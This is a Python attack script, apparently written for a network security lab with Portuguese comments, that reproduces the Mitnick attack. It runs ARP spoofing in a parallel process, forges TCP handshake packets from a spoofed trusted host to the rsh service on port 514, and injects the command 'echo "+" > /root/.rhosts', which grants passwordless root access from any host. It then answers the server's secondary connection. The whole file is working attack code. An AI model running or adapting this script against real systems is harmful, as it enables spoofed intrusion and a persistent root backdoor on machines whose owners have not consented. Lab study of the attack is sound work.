#!/usr/bin/python3

import scapy.all as scapy
import multiprocessing
import arpspoof

def manda_pacotes():
   # -----------------Manda pacote SYN-----------------
   pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='S', seq=1234)
   rcvd = scapy.sr1(pkt, iface=arpspoof.get_iface(), verbose=False)

   # -----------------Manda pacote ACK-----------------
   pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=1235, ack=rcvd.seq + 1)
   scapy.send(pkt, verbose=False)

   ## CONEXAO ABERTA!!!!
   # -----------------Manda pacote RSH-----------------
   data = '1022\x00root\x00root\x00echo "+" > /root/.rhosts\x00'
   pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=1235, ack=rcvd.seq + 1) / scapy.Raw(load=data)
   scapy.send(pkt, verbose=False)

   # -----------------Captura pacote do x-terminal que foi mandado na porta secundaria-----------------
   rcvd = scapy.sniff(count=1, iface=arpspoof.get_iface(), filter="tcp and src host 10.9.0.5")

   # -----------------Manda pacote SYN+ACK na porta secundaria-----------------
   pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1022, dport=1023, flags='SA', seq=123, ack=rcvd[0].seq + 1)
   scapy.send(pkt, verbose=False)

def main():
   # Inicia outra thread pra rodar arpspoofing
   ThreadArp = multiprocessing.Process(target=arpspoof.arpspoofing)
   ThreadArp.start()

   # Manda os pacotes forjados pela rede
   manda_pacotes()

   # Para o ArpSpoofing
   ThreadArp.terminate()

   print("Acesso ao X-Terminal liberado!!")

if __name__ == "__main__":
   main()